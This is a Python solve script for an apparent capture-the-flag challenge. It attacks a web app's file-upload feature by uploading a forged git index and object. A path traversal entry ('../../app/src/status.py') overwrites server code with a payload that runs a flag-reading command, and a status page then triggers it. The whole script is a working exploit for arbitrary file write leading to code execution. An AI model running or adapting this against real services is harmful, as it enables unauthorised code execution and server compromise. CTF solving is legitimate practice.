#!/usr/bin/env python3

# Clanker generated solve
import argparse, hashlib, struct, zlib
import requests


PAYLOAD = (
    "import subprocess\n"
    "\n"
    "def uptime():\n"
    "    try:\n"
    "        return subprocess.check_output(['read-flag'], text=True).strip()\n"
    "    except Exception as exc:\n"
    "        return f'read-flag error: {exc}'\n"
).encode()

EMPTY_BLOB_SHA = "e69de29bb2d1d6434b8b29ae775ad8c2e48c5391"


def blob_sha(content: bytes) -> str:
    header = f"blob {len(content)}\x00".encode()
    return hashlib.sha1(header + content).hexdigest()


def compress_blob(content: bytes) -> bytes:
    header = f"blob {len(content)}\x00".encode()
    return zlib.compress(header + content)


def loose_object_path(sha: str) -> str:
    return f".git/objects/{sha[:2]}/{sha[2:]}"


def make_entry(sha_hex: str, fname: bytes, content_size: int) -> bytes:
    sha_bin = bytes.fromhex(sha_hex)
    stat_fields = struct.pack(">IIIIIIIIII", 0, 0, 0, 0, 0, 0, 0o100644, 0, 0, content_size)
    flags = struct.pack(">H", min(len(fname), 0xFFF))
    entry_base = stat_fields + sha_bin + flags + fname
    pad_len = 8 - (len(entry_base) % 8) or 8
    return entry_base + b"\x00" * pad_len


def build_index(entries: list[tuple[str, bytes, int]]) -> bytes:
    # entries must be sorted by filename bytes
    entries_sorted = sorted(entries, key=lambda e: e[1])
    encoded = b"".join(make_entry(sha, fname, size) for sha, fname, size in entries_sorted)
    header = b"DIRC" + struct.pack(">II", 2, len(entries_sorted))
    body = header + encoded
    return body + hashlib.sha1(body).digest()


def login(base: str, user: str, password: str) -> requests.Session:
    sess = requests.Session()
    r = sess.post(f"{base}/register", data={"username": user, "password": password},
                  allow_redirects=True, timeout=15)
    if "Username already exists" in r.text or r.status_code >= 400:
        sess.post(f"{base}/login", data={"username": user, "password": password},
                  allow_redirects=True, timeout=15)
    assert sess.get(f"{base}/listing", timeout=10).status_code == 200, "Auth failed"
    return sess


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://localhost:5000")
    parser.add_argument("--user", default="solver")
    parser.add_argument("--password", default="solver123")
    args = parser.parse_args()
    base = args.base.rstrip("/")

    payload_sha = blob_sha(PAYLOAD)
    obj_data    = compress_blob(PAYLOAD)
    obj_path    = loose_object_path(payload_sha)

    # Two index entries:
    #   1. flag.txt         → empty blob (always exists post git-init, satisfies app's open())
    #   2. ../../app/src/status.py → our payload blob (path traversal)
    # Sorted lexicographically: "../../app/src/status.py" < "flag.txt"
    idx_data = build_index([
        (EMPTY_BLOB_SHA, b"flag.txt",               0),
        (payload_sha,    b"../../app/src/status.py", len(PAYLOAD)),
    ])

    print(f"[+] payload SHA : {payload_sha}")
    print(f"[+] object path : {obj_path}")

    sess = login(base, args.user, args.password)
    print("[+] authenticated")

    resp = sess.post(
        f"{base}/clanker-feature",
        files=[
            ("file", (obj_path,     obj_data, "application/octet-stream")),
            ("file", (".git/index", idx_data, "application/octet-stream")),
        ],
        timeout=90,
    )
    print(f"[+] /clanker-feature : {resp.status_code}")
    if resp.status_code >= 400:
        print(resp.text)

    status = sess.get(f"{base}/server-status", timeout=20)
    print(f"[+] /server-status   : {status.status_code}")
    print(status.text)

    if "bctf{" in status.text:
        start = status.text.index("bctf{")
        end   = status.text.index("}", start) + 1
        print(f"\n[+] FLAG: {status.text[start:end]}")
    else:
        print("[!] flag not found")


if __name__ == "__main__":
    main()